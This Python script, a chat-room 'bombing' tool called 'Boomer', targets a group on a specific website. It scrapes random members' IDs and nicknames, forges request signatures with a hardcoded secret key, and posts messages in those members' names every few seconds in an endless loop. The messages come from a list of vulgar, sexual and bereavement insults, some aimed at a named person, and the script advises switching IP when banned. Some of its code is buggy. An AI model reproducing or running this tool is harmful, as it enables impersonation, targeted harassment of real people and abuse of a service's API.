# -*- coding: UTF-8 -*-
import json
from hashlib import md5
from os import system
from random import randint
from time import sleep, time
from requests import get

import urllib.parse

a = urllib.parse.quote()
system("title Boomer")
print("Code by Fuck_WEILEI Team\n")
roomname = str(input("你想要启动轰炸的群组是:"))
print()

word = ["没事的时候多抬头看看天，也许你马也在天上看着你","我想给你妈一朵花,对不起我忘了,我没有花,你也没有妈","你就一废物，我打你都觉得丢人！",
        "听说你们家户口本只有一页","我这就开微信摇一摇，看能不能摇到你马","一杯焦糖玛奇朵，有焦糖和奇朵，你马呢？","你本来叫张弛，现在叫张也，因为没了马",
        "你马没了！Сука блядь！Сука блядь！","他干了什么你们骂他","魏雷你麦炸了，不，我不爱你，是你妈炸了","瞧我这记性，又把你当人看了",
        "老子给你一坨子！他娘的脑子进粪了！","看看你那丑恶的嘴脸！隔壁约翰太太一定会很乐意用皮鞭抽你的！","你是青青草原上的灰太狼，你在3000多集中找不到你的母亲。",
        "如果你母亲没有大量生产，那么我建议你离我远点。","吔屎啦你！","网恋选我我超甜，既骗感情又骗钱","王勃曰：你妈与孤鹜齐飞，黄河与你妈同色",
        "我看你是老鹰打饱嗝，鸡儿吃多了","速度七十迈，心情是日你妈嗨","吃点什么，喂你吃扇贝（SB），粽子（ZZ），青柠檬（QNM)，给你饭卡(FK)，炒糯米(CNM),热柠檬（RNM），还有特色小吃馍馍片（MMP）！",
        "我看你家服务器是用土豆做的！","过度的欲望终会让人失去理智","你是灰太狼，天天被你老婆暴打，但为什么你找不到妈，因为你妈被你老婆锤上天飞走了",
        "鬼雷委了变成了魏雷，那你知道为什么是魏吗，因为你先委了","แม่ของแล้วแม่ของคุณตาคุณตายแล้วแม่ขล้ว","Η μητέρα σου πυ έθυανε.","Таны ээж нас барсан байна",
        "让我康康，你发育的正不正常","这么垃圾的软件有用的必要吗？","我常因为不够变态，而感到与你们格格不入","草泥马","对方拒收了你的消息并脱光了你的衣服",
        "赶快让魏雷来认错","我要把你变成欲求不满的肉便器","你是愿意当一辈子狗群员，还是当三分钟车神","爷把你马挂在黄山迎客松上喜迎八方来客","你去拍张单人照，挂在家里当全家福"]
lenth = len(word) - 1

getmd5 = md5()

"""
link = 'http://zhinengjiaju.vip/xczx/saidwords.action?roomid=房间号&uid=Ta用户ID&words=内容&nickname=用户名&timestamp=时间戳&salt=MD5'
link2 = 'roomid=房间号&uid=Ta用户ID&words=内容&nickname=用户名&timestamp=时间戳&salt=MD5'
"""

key = 'fnakdjsgangaj65984qdvcvo71as1a3ds1g56a1g5a1ggagra&gajg15615avasggsa66a15g651a71ger1g5ar1g56ytiu7'



def do():
    unixtime = str(int(time() * 1000))
    print("\n轰炸中...")
    o = get("https://zhinengjiaju.vip/xczx/gettalks.action?roomid=%s"%(roomname))
    data2 = o.json()['room']['talks']
    number = data2[randint(0,399)]
    data3 = eval(str(number))
    uid = str(data3['uid'])
    name = str(data3['nickname'])
    if "无名氏" in name or "<img" in name:
        print("\n当前抓取到的人的昵称不适宜新版本，正在重新获取.")
        do()
    else:
        words = word[randint(0,lenth)]
        md5_s = "roomid=%s&uid=%s&words=%s&nickname=%s&timestamp=%s&key=%s"%(roomname,uid,name,words,unixtime,key)
        md5_s_utf = md5_s.encode(encoding='utf-8')
        getmd5.update(md5_s_utf)
        md5 = getmd5.hexdigest()
        url = "http://zhinengjiaju.vip/xczx/saidwords.action?roomid=%s&uid=%s&words=%s&nickname=%s&timestamp=%s&salt=%s"%(roomname,uid,words,name,unixtime,md5)
        print("URL=%s\nUID=%s\nNAME=%s\nTIME=%s\nWORDS=%s"%(url,uid,name,unixtime,words))
        a = get(url)
        print("RETURN=" + a.text)
        print("Done.")

while True:
    sleeptime = randint(6,13)
    sleep(sleeptime)
    print("\n离上次轰炸过去了%d秒"%(sleeptime))
    do()

print()
print("程序非正常结束，IP可能被封禁，请更换IP再试\n")
input("回车两次以退出...")
input()
